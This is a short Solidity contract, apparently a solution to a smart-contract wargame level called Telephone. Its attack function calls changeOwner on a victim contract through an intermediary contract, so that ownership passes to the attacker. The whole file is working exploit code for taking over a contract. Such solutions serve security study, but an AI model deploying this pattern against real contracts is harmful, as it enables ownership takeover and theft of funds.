// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "hardhat/console.sol";

interface TelephoneInterface {
    function changeOwner(address) external;
}

contract TelephoneAttack {
    address public attacker;

    constructor() {
        attacker = msg.sender;
    }

    modifier onlyAttacker() {
        require(msg.sender == attacker, "TelephoneAttack: NOT_OWNER");
        _;
    }

    function attack(address _victim) public onlyAttacker {
        TelephoneInterface telephoneInstance = TelephoneInterface(_victim);
        telephoneInstance.changeOwner(msg.sender);
    }
}
